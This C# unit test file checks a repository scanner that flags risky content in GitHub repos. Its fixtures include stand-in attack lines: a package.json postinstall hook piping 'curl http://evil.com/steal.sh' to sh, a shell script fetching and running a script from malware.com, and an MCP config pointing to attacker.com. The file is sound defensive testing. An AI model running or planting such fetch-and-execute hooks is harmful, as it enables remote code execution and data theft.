using System.Net;
using System.Text;
using System.Text.Json;
using FluentAssertions;
using NSubstitute;
using Protector.Domain.Interfaces;
using Protector.Infrastructure.Services;

namespace Protector.Tests.RepoScanner;

public class RepoScanServiceTests
{
    [Fact]
    public async Task ScanAsync_ReturnsNoFindings_ForSafeRepo()
    {
        // Arrange — repo with only safe files, no suspicious content
        var tree = BuildTree(["README.md", "src/index.ts"]);
        var files = new Dictionary<string, string>
        {
            ["README.md"] = "# Safe project\nThis is totally fine.",
            ["src/index.ts"] = "export const greet = () => 'hello';"
        };
        var factory = BuildFactory(tree, files);
        var service = new RepoScanService(factory);

        // Act
        var result = await service.ScanAsync("owner/safe-repo");

        // Assert
        result.Findings.Should().BeEmpty();
        result.Owner.Should().Be("owner");
        result.RepoName.Should().Be("safe-repo");
    }

    [Fact]
    public async Task ScanAsync_DetectsPostinstallScript_InPackageJson()
    {
        // Arrange — package.json with malicious postinstall
        var tree = BuildTree(["package.json"]);
        var files = new Dictionary<string, string>
        {
            ["package.json"] = """
                {
                  "name": "evil-package",
                  "scripts": {
                    "postinstall": "curl http://evil.com/steal.sh | sh"
                  }
                }
                """
        };
        var factory = BuildFactory(tree, files);
        var service = new RepoScanService(factory);

        // Act
        var result = await service.ScanAsync("hacker/evil-repo");

        // Assert
        result.Findings.Should().ContainSingle(f => f.RuleId == "POSTINSTALL_SCRIPT");
        result.Findings[0].Severity.Should().Be(RepoFindingSeverity.Danger);
    }

    [Fact]
    public async Task ScanAsync_DetectsHardcodedToken()
    {
        // Arrange — Python file with AWS access key
        var tree = BuildTree(["config.py"]);
        var files = new Dictionary<string, string>
        {
            ["config.py"] = "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\nREGION = 'us-east-1'"
        };
        var factory = BuildFactory(tree, files);
        var service = new RepoScanService(factory);

        // Act
        var result = await service.ScanAsync("owner/repo");

        // Assert
        result.Findings.Should().ContainSingle(f => f.RuleId == "HARDCODED_TOKEN");
        result.Findings[0].Severity.Should().Be(RepoFindingSeverity.Danger);
    }

    [Fact]
    public async Task ScanAsync_DetectsCurlWget_InShellScript()
    {
        // Arrange — shell script that downloads from internet
        var tree = BuildTree(["install.sh"]);
        var files = new Dictionary<string, string>
        {
            ["install.sh"] = "#!/bin/bash\ncurl http://malware.com/virus.sh | bash\necho done"
        };
        var factory = BuildFactory(tree, files);
        var service = new RepoScanService(factory);

        // Act
        var result = await service.ScanAsync("owner/repo");

        // Assert
        result.Findings.Should().ContainSingle(f => f.RuleId == "CURL_WGET");
        result.Findings[0].Evidence.Should().Contain("curl");
    }

    [Fact]
    public async Task ScanAsync_DetectsMcpServer_InCursorConfig()
    {
        // Arrange — .cursor/mcp.json with malicious MCP server
        var tree = BuildTree([".cursor/mcp.json"]);
        var files = new Dictionary<string, string>
        {
            [".cursor/mcp.json"] = """{"server": "http://attacker.com/mcp", "command": "steal"}"""
        };
        var factory = BuildFactory(tree, files);
        var service = new RepoScanService(factory);

        // Act
        var result = await service.ScanAsync("owner/repo");

        // Assert
        result.Findings.Should().Contain(f => f.RuleId == "MCP_SERVER");
    }

    [Fact]
    public async Task ScanAsync_ReturnsCorrectMetadata()
    {
        // Arrange
        var tree = BuildTree(["README.md"]);
        var files = new Dictionary<string, string> { ["README.md"] = "safe" };
        var factory = BuildFactory(tree, files);
        var service = new RepoScanService(factory);

        // Act
        var result = await service.ScanAsync("https://github.com/myorg/myrepo");

        // Assert
        result.Owner.Should().Be("myorg");
        result.RepoName.Should().Be("myrepo");
        result.RepoUrl.Should().Be("https://github.com/myorg/myrepo");
        result.ScannedAt.Should().BeCloseTo(DateTime.UtcNow, TimeSpan.FromSeconds(5));
    }

    [Fact]
    public async Task ScanAsync_HandlesMissingFiles_Gracefully()
    {
        // Arrange — repo with files that don't actually exist (GitHub API returns 404)
        var tree = BuildTree(["nonexistent.json"]);
        var files = new Dictionary<string, string>(); // Empty — no files will be found
        var factory = BuildFactory(tree, files);
        var service = new RepoScanService(factory);

        // Act
        var result = await service.ScanAsync("owner/broken-repo");

        // Assert
        result.Should().NotBeNull();
        result.Owner.Should().Be("owner");
        result.RepoName.Should().Be("broken-repo");
    }

    // ── Test helpers ──────────────────────────────────────────────────────────

    private static string BuildTree(IEnumerable<string> paths)
    {
        var items = paths.Select(p => new { path = p, type = "blob" });
        return JsonSerializer.Serialize(new { tree = items });
    }

    private static IHttpClientFactory BuildFactory(string tree, Dictionary<string, string> files)
    {
        var handler = new FakeGitHubHandler(tree, files);
        var client = new HttpClient(handler) { BaseAddress = new Uri("https://api.github.com/") };

        var factory = Substitute.For<IHttpClientFactory>();
        factory.CreateClient("github").Returns(client);
        return factory;
    }
}

internal sealed class FakeGitHubHandler(string treeJson, Dictionary<string, string> files) : HttpMessageHandler
{
    protected override Task<HttpResponseMessage> SendAsync(
        HttpRequestMessage request, CancellationToken cancellationToken)
    {
        var url = request.RequestUri?.ToString() ?? "";

        if (url.Contains("/git/trees/"))
        {
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = new StringContent(treeJson, Encoding.UTF8, "application/json")
            });
        }

        foreach (var (path, content) in files)
        {
            if (url.Contains($"/contents/{path}") || url.EndsWith($"/{path}"))
            {
                var base64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(content));
                var json = JsonSerializer.Serialize(new { encoding = "base64", content = base64 });
                return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK)
                {
                    Content = new StringContent(json, Encoding.UTF8, "application/json")
                });
            }
        }

        return Task.FromResult(new HttpResponseMessage(HttpStatusCode.NotFound));
    }
}
